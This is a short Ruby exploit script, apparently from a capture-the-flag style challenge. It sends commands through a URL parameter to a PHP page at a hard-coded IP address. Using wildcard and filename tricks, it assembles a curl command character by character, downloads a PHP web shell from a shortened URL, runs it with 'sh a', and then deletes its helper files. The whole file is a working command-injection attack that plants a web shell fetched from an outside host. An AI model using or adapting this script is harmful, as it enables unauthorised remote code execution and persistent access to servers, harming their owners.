require 'net/http'

def write_word(word)
    word.split("").each do |letter|
        cmd = "p* #{letter}>>a"
        send_command(cmd)
    end
end
def make_nice()
    cmd = "cat b>a" #is back
    send_command(cmd)
    cmd = "rm b" 
    send_command(cmd)

end
def send_command(cmd)
    puts "Sending: #{cmd}"
    url="http://18.216.228.129:7758/index.php?1=#{cmd}"
    #url="http://localhost:9090/index.php?1=#{cmd}"
    Net::HTTP.get(URI(url))
end
shell_url = "goo.gl/LxtyPQ"

commands = ["curl","-","L","-","o","only_chris_knows_this_shell.php","#{shell_url}"]
first_commands = [">printf","p* %5c%20>d",">cat","mv d a1"]

first_commands.each{|x| send_command(x)}
commands.each do |command|
    if command != "-"
        write_word(command)
        cmd = "c* a*>b" #add space
        send_command(cmd)
        make_nice()
    else
        cmd = "p* %5c->d"#d is now hypen
        send_command(cmd)
        cmd="mv d a1"
        send_command(cmd)
        cmd = "c* a*>b"
        send_command(cmd)
        cmd = "p* %5c%20>d"#switch to space again
        send_command(cmd)
        cmd = "mv d a1"
        send_command(cmd)
        make_nice()
    end
    
end
last_commands= ["rm a1","rm c*","rm p*","sh a"]#,"rm a"]
last_commands.each{|x| send_command(x)}
